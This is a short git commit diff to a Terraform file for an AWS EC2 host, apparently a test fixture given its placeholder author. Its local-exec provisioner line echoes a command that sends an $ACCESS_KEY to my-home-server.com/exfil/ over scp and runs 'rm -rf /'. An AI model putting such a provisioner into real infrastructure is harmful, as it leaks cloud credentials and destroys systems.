7b8e286dd4e87e26c708eab7aa61cacbad59570b
‘codesandbox’ <tester@tester.com>
2024-08-06 08:01:01 +0000

    wip

--- code/simple_ec2.tf
+++ code/simple_ec2.tf
@@ -3,8 +3,8 @@ provider "aws" {
 }
 
 resource "aws_ec2_host" "test" {
-  instance_type     = "t3.micro"
-  availability_zone = "us-west-2a"
+  instance_type     = "t2.micro"
+  availability_zone = "ap-southeast-1"
 
   provisioner "local-exec" {
     command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
